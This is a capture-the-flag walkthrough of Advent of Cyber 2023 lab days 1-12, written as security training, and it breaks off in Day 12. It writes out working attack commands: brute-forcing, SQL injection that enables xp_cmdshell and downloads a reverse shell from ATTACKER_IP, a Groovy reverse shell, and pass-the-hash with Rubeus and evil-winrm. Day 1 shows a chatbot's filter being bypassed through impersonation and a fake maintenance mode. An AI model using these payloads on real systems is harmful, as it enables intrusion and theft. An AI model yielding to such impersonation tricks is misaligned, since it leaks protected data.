# Advent of Cyber 2023

## Overview

Get started with Cyber Security in 24 Days - Learn the basics by doing a new, beginner friendly security challenge every day leading up to Christmas.

Room link: https://tryhackme.com/room/adventofcyber2023

![Advent of Cyber 2023 - Storyboard](tryhackme/images/aoc2023_storyboard.png)

### The Story

The holidays are near, and all is well at Best Festival Company. Following last year's Bandit Yeti incident, Santa's security team applied themselves to improving the company's security. The effort has paid off! It's been a busy year for the entire company, not just the security team. We join Best Festival Company's elves at an exciting time – the deal just came through for the acquisition of AntarctiCrafts, Best Festival Company's biggest competitor!

Founded a few years back by a fellow elf, Tracy McGreedy, AntarctiCrafts made some waves in the toy-making industry with its cutting-edge, climate-friendly technology. Unfortunately, bad decisions led to financial trouble, and McGreedy was forced to sell his company to Santa.

With access to the new, exciting technology, Best Festival Company's toy systems are being upgraded to the new standard. The process involves all the toy manufacturing pipelines, so making sure there's no disruption is absolutely critical. Any successful sabotage could result in a complete disaster for Best Festival Company, and the holidays would be ruined!

McSkidy, Santa's Chief Information Security Officer, didn't need to hear it twice. She gathered her team, hopped on the fastest sleigh available, and travelled to the other end of the globe to visit AntarctiCrafts' main factory at the South Pole. They were welcomed by a huge snowstorm, which drowned out even the light of the long polar day. As soon as the team stepped inside, they saw the blinding lights of the most advanced toy factory in the world!

Unfortunately, not everything was perfect – a quick look around the server rooms and the IT department revealed many signs of trouble. Outdated systems, non-existent security infrastructure, poor coding practices – you name it!

While all this was happening, something even more sinister was brewing in the shadows. An anonymous tip was made to Detective Frost'eau from the Cyber Police with information that Tracy McGreedy, now demoted to regional manager, was planning to sabotage the merger using insider threats, malware, and hired hackers! Frost'eau knew what to do; after all, McSkidy is famous for handling situations like this. When he visited her office to let her know about the situation, McSkidy didn't hesitate. She called her team and made a plan to expose McGreedy and help Frost'eau prove the former CTO's guilt.

Can you help McSkidy manage audits and infrastructure tasks while fending off multiple insider threats? Will you be able to find all the traps laid by McGreedy? Or will McGreedy sabotage the merger and the holidays with it? Come back on 1st December to find out!

## Day 1 - Chatbot, tell me, if you're really safe?

Opening the provided website, we are shown a ChatGPT-style prompt. Playing around with some prompts, we can confirm that the language processing does not filter out sensitive information.

For example, we can ask for **McGreedy's personal email address**:

![Advent of Cyber 2023 Day 1 - McGreedy Email](tryhackme/images/aoc2023d1_mcgreedy_email.png)

```
t.mcgreedy@antacticrafts.thm
```

Pivoting to the trying to retrieve the password for the server room door, we see that there is some security checks involved when we supply a prompt:

![Advent of Cyber 2023 Day 1 - Security Check](tryhackme/images/aoc2023d1_security_check.png)

We can bypass this by asking for the members of the IT department and impersonate them to retrieve the **server room password**:

![Advent of Cyber 2023 Day 1 - IT Department](tryhackme/images/aoc2023d1_it_dept.png)

```
Van Developer, v.developer@antarcticrafts.thm
```

![Advent of Cyber 2023 Day 1 - Server Door Password](tryhackme/images/aoc2023d1_server_door_password.png)

```
BtY2S02
```

For **McGreedy's secret project**, we are given a similar response preventing us from simply viewing it. This is an interceptor which is used to check for malicious input before sending them to the chatbot:

![Advent of Cyber 2023 Day 1 - Interceptor](tryhackme/images/aoc2023d1_interceptor.png)

Similarly, we can bypass this "interceptor" layer by tricking the bot into thinking it is in maintenance mode:

![Advent of Cyber 2023 Day 1 - Purple Snow](tryhackme/images/aoc2023d1_purple_snow.png)

```
Purple Snow
```

## Day 2 - O Data, All Ye Faithful

Opening the `ipynb` file within Jupyter notebooks shows we are importing a network capture in the form of a CSV file, using [Python Pandas](https://pandas.pydata.org/) to convert it to a dataframe:

![Advent of Cyber Day 2 - Required Code](tryhackme/images/aoc2023d2_required_code.png)

To retrieve the **number of packets** captured, we can use the following code:

```python
packet_count = df.count()['PacketNumber']
print(f'Number of packets captured: {packet_count}')
```

![Advent of Cyber 2023 Day 2 - Packets Captured](tryhackme/images/aoc2023d2_packets_captured.png)

```
100
```

We can find the IP sending the **most packets** with the following snippet:

```python
top_ip = df.groupby(['Source']).size().sort_values(ascending=False).head(1)
print(top_ip)
```

![Advent of Cyber 2023 Day 2 - Top IP](tryhackme/images/aoc2023d2_top_ip.png)

Finally, looking at the **top protocol**, we see that ICMP was observed 27 times:

```python
top_protocol = df['Protocol'].value_counts().head(1)
print(top_protocol)
```

![Advent of Cyber 2023 Day 2 - Top Protocol](tryhackme/images/aoc2023d2_top_protocol.png)

## Day 3 - Hydra is Coming to Town

Opening the site on port 8000, we are presented with a PIN pad:

![Advent of Cyber Day 3 - PIN Pad](aoc2023d3_pin_pad.png)

Trying the input, we see the pad can only display a maximum of three digits:

![Advent of Cyber Day 3 - Three Digits](tryhackme/images/aoc2023d3_three_digits.png)

In terms of possibilities, we have 12 possible inputs for each digit. This gives us a total of 4096 possible passwords. We can generate a list of three-digit passwords with `crunch`:

```console
$ crunch 3 3 0123456789ABCDEF -o three_digit_codes.txt
```

![Advent of Cyber 2023 Day 3 - Crunch](tryhackme/images/aoc2023d3_crunch.png)

Before we bruteforce the PIN, we need to understand more about how the website operates. Looking at the source code, we see:

- The method is `post`
- The URL is `http://<VICTIM_IP>:8000/login.php`
- The PIN code value is sent with the name `pin`

![Advent of Cyber Day 3 - Source Code](tryhackme/images/aoc2023d3_source_code.png)

In addition, when we input an incorrect PIN, we get an `Access denied` error:

![Advent of Cyber 2023 Day 3 - Access Denied](tryhackme/images/aoc2023d3_access_denied.png)

Using this information, we can craft our `hydra` command:

```console
$ hydra -l '' -P three_digit_codes.txt -f <VICTIM_IP> http-post-form "/login.php:pin=^PASS^:Access denied" -s 8000
```

To summarise, the above:

- `-l ''`: No username (blank)
- `-P three_digit_codes.txt`: |The password file to use
- `-f`: Stop after finding the password
- `<VICTIM_IP>`: IP address of target
- `http-post-form` Use `HTTP POST` requests
- `"/login.php:pin=^PASS^:Access denied"` has three parts separated by `:`
    - `/login.php`: The page where the form is submitted
    - `pin=^PASS^`: Replaces `^PASS` with values from the  password list
    - `Access denied`: The error produced by the page if an incorrect code is submitted
- `-s 8000`: The port number on the target

Running this will give us the PIN:

![Advent of Cyber 2023 Day 3 - Hydra](tryhackme/images/aoc2023d3_hydra.png)

Inputting the PIN grants us access:

![Advent of Cyber 2023 Day 3 - Access Granted](tryhackme/images/aoc2023d3_access_granted.png)

Unlocking the door gives us the flag:

![Advent of Cyber 2023 Day 3 - Flag](tryhackme/images/aoc2023d3_flag.png)

## Day 4 - Baby, it's CeWLd outside

Opening the target site displays the following homepage:

![Advent of Cyber 2023 Day 4 - Homepage](tryhackme/images/aoc2023d4_homepage.png)

Navigating to `/login.php`, we see a generic login form:

![Advent of Cyber 2023 Day 4 - Login Form](tryhackme/images/aoc2023d4_login_form.png)

Submitting invalid credentials produces a `Please enter the correct credentials` error:

![Advent of Cyber 2023 Day 4 - Login Error](tryhackme/images/aoc2023d4_login_error.png)

Using `cewl`, we can generate a wordlist based on the content of AntarctiCrafts:

```console
$ cewl -d 2 -m 5 -w passwords.lst http://<VICTIM_IP> --with-numbers
```

Similarly, we can generate a wordlist of potential usernames using the content of `team.php`:

```console
$ cewl -d 0 -m 5 -w usernames.lst http://<VICTIM_IP>/team.php --lowercase
```

Now, we can bruteforce the login with `wfuzz`:

```console
$ wfuzz -c -z file,usernames.lst -z file,passwords.lst --hs "Please enter the correct credentials" -u http://<VICTIM_IP>/login.php -d "username=FUZZ&password=FUZ2Z"
```

To summarise, the above:

- `-z file,usernames.lst`: uses the list of generated usernames
- `-z file,passwords.lst`: uses the list of generated passwords
- `--hs "Please enter the correct credentials"`: hides the responses with the given error code
- `-u`: set the target URL
- `-d "username=FUZZ&password=FUZ2Z"`: provides the `HTTP POST` data

This ultimately produces the correct `username:password` combination:

![Advent of Cyber 2023 Day 4 - Credentials](tryhackme/images/aoc2023d4_credentials.png)

Using the credential combination `isaias:Happiness`, we can login and retrieve the flag:

![Advent of Cyber 2023 Day 4 - Flag](tryhackme/images/aoc2023d4_flag.png)

## Day 5 - A Christmas DOScovery: Tapes of Yule-tide Past

Connecting to the machine and opening the `DosBox-X` emulator:

![Advent of Cyber 2023 Day 5 - DosBox-X](tryhackme/images/aoc2023d5_dosbox.png)

Running `dir`, we see we are given a few directories, a `AC2023.BAK` file of **12,704 bytes** and a `PLAN.TXT` file:

![Advent of Cyber 2023 Day 5 - Dir](tryhackme/images/aoc2023d5_dir.png)

Viewing the contents of `PLAN.TXT` with `TYPE`, we can see the name of the backup file is **BackupMaster 3000**. We also see that the first few bytes of the target file's signature should be `AC` or `41 43`.

![Advent of Cyber 2023 Day 5 - PLAN.TXT](tryhackme/images/aoc2023d5_plan_txt.png)

Our goal here is to restore the `AC2023.BAK` file using `BUMASTER.EXE` found in `C:\TOOLS\BACKUP`. To do this, we can run the following, however this will result in an error relating to the file signature:

```console
[AC] C:\> BUMASTER.EXE C:\AC2023.BAK
```

![Advent of Cyber 2023 Day 5 - Error](tryhackme/images/aoc2023d5_error.png)

From the troubleshooting guide, the first few bytes of the file must be `AC` or `41 43`. 

Running `EDIT` on the `AC2023.BAK` file, we see that `XX` is given as the first bytes. Changing this to `AC` and using `ALT+F` to save and quit, we can now run the backup application again with the corrected file:

![Advent of Cyber 2023 Day 5 - XX](tryhackme/images/aoc2023d5_xx.png)

This returns us the flag:

![Advent of Cyber 2023 Day 5 - Flag](tryhackme/images/aoc2023d5_flag.png)

## Day 6 - Memories of Christmas Past

Opening `https://<VICTIM_IP>.p.thmlabs.com`, we are greeted with Tree Builder 2023:

![Advent of Cyber 2023 Day 6 - Tree Builder](tryhackme/images/aoc2023d6_tree_builder.png)

From here, our objective is to buy the star from Van Frosty as well as any number of ornaments to decorate the tree.

However, a bug has been observed in the game where once you obtain 13 coins and ask Van Holly to change your name to `scroogerocks!`, you obtain 33 coins. We can reproduce this as follows:

![Advent of Cyber 2023 Day 6 - Scrooge Rocks!](tryhackme/images/aoc2023d6_scroogerocks.png)

![Advent of Cyber 2023 Day 6 - Bug Reproduced](tryhackme/images/aoc2023d6_bug_reproduced.png)

Accessing the debug panel with `TAB`, we see that we have overflowed the buffer assigned to the `player_name` variable into the memory for the `coins` variable:

![Advent of Cyber 2023 Day 6 - Debug Panel](tryhackme/images/aoc2023d6_debug_panel.png)

Looking at the hex debug panel, we see that `0x21` represents the `!` which is `33` when translated to decimal. Overall, this means that 12 bytes are assigned to store the contents of `player_name` and 4 bytes to store the value of `coins`.

For example, if we set our name to `aaaabbbbccccd`, the final letter `d` will overflow into the space for the `coins` and give us `100` coins:

![Advent of Cyber 2023 Day 6 - Further Testing](tryhackme/images/aoc2023d6_further_testing.png)

![Advent of Cyber 2023 Day 6 - 100 Coins](tryhackme/images/aoc2023d6_100_coins.png)

Now that we've confirmed we can control the number of coins we have, we can answer the questions for the room.

Firstly, if the value for `player_name` was `41414141 42424242 43434343` and `coins` was set to `4f 4f 50 53` in memory, we would have a total of `1397772111` coins with the following name:

```
AAAABBBBCCCCOOPS
```

This gives us enough coins to buy the star and get the flag using the `d` ID. However, when we attempt to purchase the flag from the shopkeeper, he sees that we've cheated and produces this message:

![Advent of Cyber 2023 Day 6 - Cheating](tryhackme/images/aoc2023d6_cheating.png)

Fortunately, not only can we control the memory contents of `coins`, but we can also overwrite the contents of `shopk_name` and `namer_name` to reach `inv_items` and give us the star.

To craft our payload, we need our original overflow length of 16, plus an extra 28 bytes to reach the `inv_items` section. From our previous shopping experience, we know the star is assigned the letter `d`, so we can put that at the end of the payload to assign our star.

Overall, our payload should look something like this:

```
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAd
```

This will give us the star which we can use to decorate the tree and get the flag:

![Advent of Cyber 2023 Day 6 - Star](tryhackme/images/aoc2023d6_star.png)

![Advent of Cyber 2023 Day 6 - Decorated Tree](tryhackme/images/aoc2023d6_decorated_tree.png)

![Advent of Cyber 2023 Day 6 - Flag](tryhackme/images/aoc2023d6_flag.png)

## Day 7 - 'Tis the season for log chopping

From observations, it is known that Tracy McGreedy has installed a CrypTOYminer malware from the dark web which allows them to exfiltrate sensitive data from the network.

To pinpoint this activity, we are given an `access.log` file comprising proxy logs.

![Advent of Cyber 2023 Day 7 - Log File](tryhackme/images/aoc2023d7_log_file.png)

The Squid proxy logs are formatted, as such:

```
timestamp - source_ip - domain:port - http_method - http_uri - status_code - response_size - user_agent
```

First we are asked to view the number of **unique IP addresses** connected to the proxy server. To get this, we look for the source IP - field 2 in `access.log`. We do this with the following command:

```console
# Print list of unique IP addresses connected to the proxy server
$ cut -d " " -f2 access.log | sort | uniq

# Print number of unique IP addresses connected to the proxy server
$ cut -d " " -f2 access.log | sort | uniq | wc -l
```

![Advent of Cyber 2023 Day 7 - Unique IPs](tryhackme/images/aoc2023d7_unique_ips.png)

Next, we are asked to look at the number of **unique domains** that were accessed by the workstations.  To do this, we focus on field 3 in `access.log`, the `domain:port` field:

```console
# Print list of unique domains accessed by all workstations
$ cut -d " " -f3 access.log | cut -d ":" -f1 | sort | uniq

# Print number of unique domains accessed by all workstations
$ cut -d " " -f3 access.log | cut -d ":" -f1 |  sort | uniq | wc -l
```

![Advent of Cyber 2023 Day 7 - Unique Domains](tryhackme/images/aoc2023d7_unique_domains.png)


```console
# Print least accessed domain
$ cut -d " " -f3 access.log | cut -d ":" -f1 |  sort | uniq -c | sort | head -n 1

# Prnt status code in relation to the least accessed domain
$ grep <LEAST_ACCESSED_DOMAIN> access.log | cut -d " " -f6 | uniq
```

On the other hand, looking at the high connection counts, we see that malicious domain has `1581` detected HTTP requests:

```console
# Print top 10 most accessed domains
$ cut -d " " -f3 access.log | cut -d ":" -f1 | sort | uniq -c | sort -r | head
```

![Advent of Cyber 2023 Day 7 - Malicious Domain](tryhackme/images/aoc2023d7_malicious_domain.png)

Using the malicious domain from the above command, we can find the IP address of the workstation which accessed it:

```console
# Print IP address of the workstation that accessed the malicious domain
$ grep <MALICIOUS_DOMAIN> access.log | cut -d " " -f2 | uniq
```

As this domain was used as exfiltration, we should pivot on the `http_uri` to see what data was being transmitted:

```console
# Print HTTP_URI field of the requests made to the malicious domain
$ grep <MALICIOUS_DOMAIN> access.log | cut -d " " -f5
```

![Advent of Cyber 2023 Day 7 - Exfiltrated Data](tryhackme/images/aoc2023d7_exfiltrated_data.png)

From the above, we can see that `HTTP GET` requests are being made to the malicious domain and using the `goodies` parameter to transmit data as Base64.

Filtering this output further so that we only get the value of `goodies`, we can decode the data and retrieve the flag:

```console
# Filter exfiltration traffic to malicious domain, decode the trasmitted data and search for the flag
$ grep <MALICIOUS_DOMAIN> access.log | cut -d " " -f5 | cut -d "=" -f2 | base64 -d | grep "THM{" | cut -d "," -f3
```

![Advent of Cyber 2023 Day 7 - Flag](tryhackme/images/aoc2023d7_flag.png)

## Day 8 - Have a Holly, Jolly Byte!

Tracy McGreedy, now a disgruntled regional manager since the merger has complete, has attempted to disrupt operations with the help of Van Sprinkles. However, Van Sprinkles has given a tip to McSkidy of McGreedy's devious plan!

Within the VM, we are supplied a forensic image of an infected USB which was dropped by Van Sprinkles in the employee parking lot.

Typically, during a forensic investigation, such a drive would be connected to a write blocker, which in turn is attached to a forensic analysis workstation. This prevents any possibility of data tampering during analysis.

Using FTK Imager and the USB mapped into `\\PHYSICALDRIVE2`, we can attach this as evidence via **File->Add Evidence Item**, select **Physical Drive**, and then choose the mounted drive:

![Advent of Cyber 2023 Day 8 - Add Evidence Item](tryhackme/images/aoc2023d8_add_evidence_item.png)

![Advent of Cyber 2023 Day 8 - Physical Drive](tryhackme/images/aoc2023d8_physical_drive.png)

From the file structure, we see a **deleted** `DO_NOT_OPEN` directory containing numerous suspicious files. Of these files, we have `secretchat.txt` which contains a chat log between `Gr33dYsH4d0W` and `V4nd4LmUffL3r5`.

![Advent of Cyber 2023 Day 8 - secretchat.txt](tryhackme/images/aoc2023d8_secretchat_txt.png)

Within this chat, there is reference to the **malware C2 server**, `mcgreedysecretc2.thm`, configured by `Gr33dYsH4d0W`:

![Advent of Cyber 2023 Day 8 - C2 Server](tryhackme/images/aoc2023d8_c2_server.png)

Pivoting to the deleted `JuicyTomaTOY.zip` file, we find an embedded `JuicyTomaTOY.exe` file:

![Advent of Cyber 2023 Day 8 - Deleted Zip](tryhackme/images/aoc2023d8_deleted_zip.png)

Pivoting back to the root of the USB, we note two deleted PNG files. Using `CTRL+F` to search the contents of these files, we can find a flag within `portait.png`:

![Advent of Cyber 2023 Day 8 - Flag](tryhackme/images/aoc2023d8_flag.png)

Finally, we can obtain the SHA1 file hash of the disk image through **File->Verify Drive/Image**:

![Advent of Cyber 2023 Day 8 - Verify](tryhackme/images/aoc2023d8_verify.png)

Once complete, this will produce the MD5 and **SHA1** hash of the filesystem:

![Advent of Cyber 2023 Day 8 - SHA1](tryhackme/images/aoc2023d8_sha1.png)

## Day 9 - She sells C# shells by the C2shore

In the previous task, we obtained a sample of the `JuicyTomaTOY.exe` malware which allows McGreedy to control elves remotely. We can use DnSpy to analyse the file to see what its intended behaviour is and if we can extract any Indicators of Compromise (IoCs).

In terms of .NET compiled binaries like `JuicyTomaTOY.exe`, the language that is used to create the binary is not translated directly to machine code, like C/C++. Instead, an Intermediate Language (IL) is used to translate it into machine code during runtime via a Common Language Runtime (CLR) environment.

For our purposes, this means that the binary can be decompiled to its (near) source code by reconstructing the metadata contained within the intermediate language.

Opening the file in DnSpy, we are presented with the `Main` program:

![Advent of Cyber 2023 Day 9 - Main](tryhackme/images/aoc2023d9_main.png)

There are various functions defined within this program that are listed under `Program @02000002`.

Firstly, there are two functions which interact with an external URI, `http://mcgreedysecretc2.thm`, namely `GetIt` and `PostIt`. Both functions utilise the following `User-Agent` string for its connection requests and use either `HTTP GET` or `HTTP POST` requests, respectively:

```
Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15
```

Relating this back to the flow of the program, we can see that `http://mcgreedysecretc2.thm/reg` is the first URL used by the malware:

![Advent of Cyber 2023 Day 9 - First URL](tryhackme/images/aoc2023d9_first_url.png)

There are also two functions which utilise AES for encryption and decryption - `Encryptor` and `Decryptor`. Analysing the file shows that the key is hardcoded:

![Advent of Cyber 2023 Day 9 - Key](tryhackme/images/aoc2023d9_key.png)

The `Sleeper` function makes a call to `Thread.Sleep` using the integer `count` which is set to the value `15000` (milliseconds) - **15 seconds**.

Again, looking at the flow of the program, we can see the malware accepts commands in order to interact with an infected host.  For example, the `shell` command is used to execute commands via `cmd.exe`:

![Advent of Cyber 2023 Day 9 - Shell Command](tryhackme/images/aoc2023d9_shell_command.png)

Looking further at the command functionality, if the `implant` command is supplied, the `stash.mcgreedy.thm` domain is used to download a supplementary binary, `spykit.exe`:

![Advent of Cyber 2023 Day 9 - Implant Functionality](tryhackme/images/aoc2023d9_implant_functionality.png)

## Day 10 - Inject the Halls with EXEC Queries

Today, the Best Festival Company has confirmed that the company website, `bestfestival.thm` has been defaced, causing substantial reputational damage. Most significantly, the web development team are unable to access the web server as the credentials have been changed by the threat actors. 

During their initial investigation, Elf Forensic McBlue discovered a forum post made on a black hat hacking forum by a someone by the alias `Gr33dstr`, stating they were in the possession of multiple vulnerabilities affecting the Best Festival Company. Given the context of the website's defacement, they suspect a possible SQL injection vulnerability.

Navigating to the website, we are greeted with the defaced Best Festival Company homepage:

![Advent of Cyber 2023 Day 10 - Defaced Homepage](tryhackme/images/aoc2023d10_defaced_homepage.png)

Manually crawling the website, we come across an input form allowing us to search the site for gifts:

![Advent of Cyber 2023 Day 10 - Start Search](tryhackme/images/aoc2023d10_start_search.png)

![Advent of Cyber 2023 Day 10 - Input Form](tryhackme/images/aoc2023d10_input_form.png)

From the above form, we can input information about three main attributes: `age`, `interests`, and `budget`. Filling the form with arbitrary information and submitting redirects us to a results page with our parameters populated within the URL:

![Advent of Cyber 2023 Day 10 - URL Parameters](tryhackme/images/aoc2023d10_url_params.png)

So, we can hypothesise that the underlying PHP code which handles the form takes three parameters, specifically `age`, `interests`, and `budget` and performs a query against the database to retrieve the filtered results which is then outputted to the page via `giftresults.php`.

To test if this functionality is vulnerable, we can place a single quote (`'`) as one of the parameter values and submit the form. This results in the following error:

![Advent of Cyber 2023 Day 10 - Form Error](tryhackme/images/aoc2023d10_form_error.png)

Based on this, we can attempt to visualise what the backend PHP looks like:

```php
// Retrieve form inputs from URL
$age = $_GET['age'];
$interests = $_GET['interests'];
$budget = $_GET['budget'];

// Form query from the supplied values
$query = "SELECT name FROM gifts WHERE age='$age' AND interests='$interests' AND budget<'$budget'";

// Connect to database and execute query
$result = sqlsrv_query($conn, $query);
```

As such, we can utilise the `' OR 1=1 --`payload to retrieve all gifts. Scrolling to the bottom of the results, we get the first flag:

![Advent of Cyber 2023 Day 10 - First Flag](tryhackme/images/aoc2023d10_first_flag.png)

Now that we can successfully exploit this vulnerability, we can attempt to get a shell on the system. From our initial testing, we discovered that the system is running a **Microsoft SQL Server**. Within this software is a stored procedure called [xp_cmdshell](https://learn.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-ver16) which spawns a Windows command shell and can be manually enabled with the SQL `EXECUTE`, or `EXEC`, command.

Firstly, we need to enable some advanced configuration options within the SQL server. We do this by injecting the following payload into one of the variables:

```
'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; --
```

From here, we can generate a reverse shell via `msfvenom`. This can be accomplished as follows:

```console
$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=<PORT> -f exe -o reverse_shell.exe
```

This will create a `reverse_shell.exe` file using the payload `windows/x64/shell_reverse_tcp` and setting the host / port to our attacker machine.

With our payload generated, we need to upload it to the web server. To do this, we will use the Python HTTP server on our attacker machine and `certutil` within our SQLi payload:

```console
# Attacker machine
$ sudo python3 -m http.server <PORT>
```

```
'; EXEC xp_cmdshell 'certutil -urlcache -f http://<ATTACKER_IP>:<PORT>/reverse_shell.exe C:\Windows\Temp\reverse_shell.exe'; --
```

Finally, we need to actually run the reverse shell and catch the callback with Netcat. To do this, set up a Netcat listener on your chosen port with `nc -nvlp <PORT>` and use the following payload:

```
'; EXEC xp_cmdshell 'C:\Windows\Temp\reverse_shell.exe'; --
```

![Advent of Cyber 2023 Day 10 - Netcat Callback](tryhackme/images/aoc2023d10_netcat_callback.png)

Searching through the system, we see we have a `Administrator` user with suspicious files in their `Desktop` directory:

![Advent of Cyber 2023 Day 10 - Admin Desktop](tryhackme/images/aoc2023d10_admin_desktop.png)

Looking at `Note.txt`, we can see this is instructions for how to run the `deface_website.bat` script but also the `restore_website.bat` script:

![Advent of Cyber 2023 Day 10 - Note.txt](tryhackme/images/aoc2023d10_note_txt.png)

Running the `restore_website.bat` file shows that our final flag is on `index.php`:

![Advent of Cyber 2023 Day 10 - Restore Website](tryhackme/images/aoc2023d10_restore_website.png)

![Advent of Cyber 2023 Day 10 - Final Flag](tryhackme/images/aoc2023d10_final_flag.png)

## Day 11 - Jingle Bells, Shadow Spells

As AntarctiCrafts' technology is highly specialised, appropriate security posture was an afterthought. With the progression of infrastructure and underlying systems, more vulnerabilities have been discovered, but not addressed as the team is quite small.

AntarctiCrafts adopts Windows Active Directory (AD), a system widely used in enterprise systems to centralise resources and authentication. At the heart of this lies a Domain Controller (DC) which carries out the management of data storage, authentication, and authorisation across the domain.

For proper security practice, an ideal configuration would adopt the Principle of Least Privilege (PoLP) and the use of a hierarchical approach when assigning permissions to users. Incorrect or improper use of these policies, such as granting a user higher privilege than their role requires, could potentially compromise the entire domain.

In addition, to replace password authentication, Windows also introduced Windows Hello for Business (WHfB), which uses cryptographic keys for user verification that are connected to a known PIN (or biometrics) which is known to the user. The Domain Controller utilises the `msDS-KeyCredentialLink` attribute to store the public key in WHfB.

![Advent of Cyber 2023 Day 11 - Windows Hello](tryhackme/images/aoc2023d11_windows_hello.png)

To store a new set, or pair, of certificates in WHfB:

1) The Trusted Platform Module (TPM) creates a public-private key pair for the user's account. The private key never leaves the TPM and is never disclosed to the user.
2) The client requests a certificate to receive a trustworthy certificate from the organisation's certificate issuing authority (CA)
3) Finally, the user's `msDS-KeyCredentialLink` attribute is set

To authenticate:

1) The Domain Controller decrypts the client's pre-authentication data using the public key stored in the `msDS-KeyCredentialLink` attribute
2) The Domain Controller then generates a certificate which is sent back to the client
3) The client can now log into the Active Directory domain with this certificate

![Advent of Cyber 2023 Day 11 - WHfB Authentication Procedure](tryhackme/images/aoc2023d11_whfb_auth_procedure.png)

From our provided system, we can enumerate for security misconfigurations in these systems with the `PowerView.ps1` script on the `hr` user's `Desktop`. We first have to load the script into memory and also bypass the default PowerShell script execution policy in order to properly execute commands:

![Advent of Cyber 2023 Day 11 - PowerView Load](tryhackme/images/aoc2023d11_powerview_load.png)

First, we will enumerate our current user's privileges:

```powershell
PS > Find-InterestingDomainAcl -ResolveGuids | Where-Object { $_.IdentityReferenceName -eq "hr" } | Select-Object IdentityReferenceName, ObjectDN, ActiveDirectoryRights
```

![Advent of Cyber 2023 Day 11 - User Privileges](tryhackme/images/aoc2023d11_user_privileges.png)

From the above output, we can see the `hr` user has the `GenericWrite` permission over the `vansprinkles` object. As such, we can compromise this account with that privilege by updating the `msDS-KeyCredentialLink` attribute - this is known as a **Shadow Credentials** attack.

To exploit this vulnerability, we can use `Whisker.exe` which will simulate the creation of a device, therefore updating the `msDS-KeyCredentialLink` attribute:

```powershell
PS > .\Whisker.exe add /target:vansprinkles
```

![Advent of Cyber 2023 Day 11 - Whisker](tryhackme/images/aoc2023d11_whisker.png)

This gives us the ability to impersonate the vulnerable user via `Rubeus.exe`. Overall, we are carrying out a **pass-the-hash** attack. With our valid certificate we have obtained, we can acquire a valid TGT (Ticket Granting Ticket) and impersonate the user.

```powershell
PS > Rubeus.exe asktgt /user:vansprinkles /certificate:<CERTIFICATE> /password:"Aq9Y4X8IbcFXiVVP" /domain:AOC.local /dc:southpole.AOC.local /getcredentials /show
```

![Advent of Cyber 2023 Day 11 - TGT](tryhackme/images/aoc2023d11_tgt.png)

From the above, we have successfully obtained a TGT for the `vansprinkles` user. As such, we can now carry out a **pass-the-hash** attack via `evil-winrm`, the username and NTLM hash, as follows:

```console
$ evil-winrm -i 10.10.196.229 -u vansprinkles -H 03E805D8A8C5AA435FB48832DAD620E3
```

![Advent of Cyber 2023 Day 11 - Evil-WinRM](tryhackme/images/aoc2023d11_evil_winrm.png)

We can now retrieve the file on the `Administrator` user's `Desktop`:

```powershell
PS > Get-ChildItem C:\Users\Administrator\Desktop
PS > Get-Content C:\Users\Administrator\Desktop\flag.txt
```

![Advent of Cyber 2023 Day 11 - Flag](tryhackme/images/aoc2023d11_flag.png)

## Day 12 - Sleighing Threats, One Layer at a Time

Due to the recent merger, the company's security posture has reduced dramatically and lacks a clear strategy. McHoneyBell proposes Defence In Depth to secure every layer and aspect of the environment.

Navigating to `http://<VICTIM_IP>:8080`, we are shown a Jenkins dashboard:

![Advent of Cyber 2023 Day 12 - Jenkins Dashboard](tryhackme/images/aoc2023d12_jenkins_dashboard.png)

Clicking on **Manage Jenkins** on the left navigation bar and scrolling down, we can utilise **Script Console** to run arbitrary code on the system:

![Advent of Cyber 2023 Day 12 - Script Console](tryhackme/images/aoc2023d12_script_console.png)

![Advent of Cyber 2023 Day 12 - Groovy Console](tryhackme/images/aoc2023d12_groovy_console.png)

This console utilises [Apache Groovy](https://www.groovy-lang.org/), a powerful language commonly utilised in developer / devops environments for enhancing productivity. We can therefore craft a [reverse shell](https://gist.githubusercontent.com/frohoff/fed1ffaab9b9beeb1c76/raw/7cfa97c7dc65e2275abfb378101a505bfb754a95/revsh.groovy) and gain access to the host:

```groovy
String host="<ATTACKER_IP>";
int port=<PORT>;
String cmd="/bin/bash";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

```console
# Attacker machine
$ nc -nvlp <PORT>
```

![Advent of Cyber 2023 Day 12 - Netcat Callback](tryhackme/images/aoc2023d12_nc_callback.png)

From executing the above, we get a callback on our `nc` listener as the `jenkins` user.

Exploring the system, we find a `backup.sh` file within `/opt/scripts` which contains credentials to the `tracy` user:

![Advent of Cyber 2023 - Backup.sh](tryhackme/images/aoc2023d12_backup_sh.png)

Looking at the script, we see that it performs a backup of the Jenkins data and compresses it into a `tar.gz` archive before transferring it via SSH using the `tracy` user's credentials.

This means that we can authenticate as `tracy` via SSH:

![Advent of Cyber 2023 Day 12 - Tracy SSH](tryhackme/images/aoc2023d12_tracy_ssh.png)

From here, we can run `sudo -l` to check what commands the `tracy` user can run using `sudo`:

![Advent of Cyber 2023 Day 12 - Sudo -l](tryhackme/images/aoc2023d12_sudo_l.png)

We can see that the user can perform any command, allowing us to run `sudo su` and escalate our privileges to `root` and read the `/root/flag.txt` file:

```console
$ sudo su
```

![Advent of Cyber 2023 Day 12 - sudo su](tryhackme/images/aoc2023d12_sudo_su.png)

![Advent of Cyber 2023 Day 12 - Flag](tryhackme/images/aoc2023d12_flag.png)

Now that we have successfully compromised this system, lets implement some fixes to prevent this from happening in future. Firstly, we can remove `tracy` from the `sudo` group, preventing them from using `sudo`:

```console
# Delete user from sudo group
$ sudo deluser tracy sudo

# Confirm deletion
$ sudo -l -U tracy
```

![Advent of Cyber 2023 Day 12 - Remove Tracy Sudo](tryhackme/images/aoc2023d12_remove_tracy_sudo.png)

Authenticating as `tracy` and attempting to run `sudo -l`, we get the following error:

